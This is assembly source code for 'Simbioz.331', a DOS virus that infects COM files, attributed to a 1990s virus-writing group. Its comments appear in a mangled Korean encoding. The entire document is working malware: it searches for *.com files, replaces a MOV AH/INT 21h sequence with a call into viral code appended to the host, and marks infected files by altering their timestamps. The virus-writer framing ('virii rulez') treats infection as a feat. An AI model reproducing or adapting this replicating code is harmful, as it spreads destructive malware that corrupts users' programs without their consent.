;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; Simbioz.331 virus                                             CVC #01  97/06
;
; �A�b�a : Reminder [DVC]
; �e�i�e�� : Osiris / CVC
; ���w���w COM �q�q
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

.286                                    ; 286 ���w�A�� �b��
.model tiny
.code
org 100h                                ; 100h
start:

lea dx,mess
call virus                              ; �a����a �b��
nop
int 20h
mess db 'virii rulez$'                  ; �A����

virus:
mov word ptr cs:_bp,bp
pop bp
sub bp,3                                ;
pusha                                   ;
push ds es
call $+3                                ; �I�a ���a�U ���q
pop si                                  ;
sub si,($-virus)-1                      ;

restore_orig_4_bytes:
mov ah,byte ptr cs:[offset orig-offset virus+si ]
mov al,0b4h                             ; 100h �A ���� �A���ᝡ ���� ��Ǳ
mov cs:[bp],ax
mov cs:[bp+2],21cdh
mov bp,si

get_dta:
mov ah,2fh                              ; DTA ���
int 21h
mov word ptr cs:_dta,bx                 ; ���� DTA ��w
mov word ptr cs:_dta,es                 ; ��ɷ �A�a���a : 0080h ��

set_dta:
mov ax,cs
add ax,2000h
mov ds,ax
xor dx,dx
mov ah,1ah
int 21h

find_first:
mov ah,4eh                              ; �a�� �x��
mov cx,20h                              ; ����
mov dx,offset fmask-offset virus        ; �x���a �a�e �a�� ���q
add dx,si
push ds cs                              ; cs=ds
pop ds
int 21h
pop ds
find:
jnc save
_er:
jmp er                                  ; �A�� �i��

find_next:
mov ax,cs
add ax,2000h
mov ds,ax

mov ah,4fh                              ; �a�q �a�� �x��
int 21h
jmp find

save:
mov ax,ds:[16h]
mov cs:_time,ax                         ; �q�q ��ǩ �a���� �b���� ��q
and al,01fh
cmp al,7
jz find_next
mov ax,ds:[18h]
mov cs:_date,ax

open_find_file:
mov ax,3d02h                            ; �a�� ���e
mov dx,1eh
int 21h
jnc read_file
jmp find_next
read_file:
xchg ax,bx                              ; BX = �a�� Ѕ�i

change_segment:                         ; �A�a���a �a����
mov ax,ds
add ax,10h
mov ds,ax

mov ah,3fh                              ; �a�� ����
xor dx,dx
mov cx,0f000h
int 21h
jnc search_code
jmp close

search_code:
push ds                                 ; ds=es
pop es
mov cx,ax
mov si,ax
mov di,dx
uuu:
mov al,0b4h
new:
cld
repne scasb                             ; B4h �x��
jne close
cmp word ptr es:[di+1],21CDh            ; Int 21h ���a ?
jne new
great:
mov ax,di
dec ax
mov cx,si
mov si,ax
mov dx,cx
sub dx,ax
sub dx,3

change_code:
mov byte ptr ds:[si],0e8h               ; call �w�w
mov al,byte ptr ds:[si+1]
mov byte ptr cs:[offset orig - offset virus + bp],al
mov word ptr ds:[si+1],dx               ; �����t
in al,42h
mov byte ptr ds:[si+3],al

pointer_to_begin:
push cx
mov ax,4200h                            ; ͡����i ��q�a�� ����
xor cx,cx
xor dx,dx
int 21h
pop cx
jc close

save_file:
mov ah,40h                              ; �|���� �a�� (�a����a�� ���a)
xor dx,dx
int 21h
jc rest

pointer_to_end:
mov ax,4202h                            ; �a�� �{�a�� ����
xor cx,cx
xor dx,dx
int 21h
jc rest

save_virus:
mov ah,40h                              ; �a����a �a��
mov cx,virlen
push cs
pop ds
mov dx,bp
int 21h
jc rest

change_time_to_7_second:
mov ax,cs:_time                         ; �q�q���e �a��
and al,01fh                             ; (�a����a�� �q�q �a���� ��Ȃ)
add al,7
mov cs:_time,ax

rest:
mov ax,5701h                            ; ���� ���e�a�� �a��
mov dx,cs:_date                         ; ���� ���e �a����a 7 ���� �a��
mov cx,cs:_time
int 21h

close:
mov ah,3eh                              ; �a�� �h��
int 21h

jmp find_next

er:
mov ah,1ah                              ; ���� DTA �� ���
lds dx,cs:_dta
int 21h
pop es ds
popa
push bp
mov bp,word ptr cs:_bp
ret

fmask db '*.com',0                      ; *.com �a��
iam db '[Simbioz.Inside]'               ; �a����a ���q
_bp equ 0feh
_dta equ 0f0h
_time equ 0f4h
_date equ 0f6h
orig db 9
virlen equ $-virus
end start

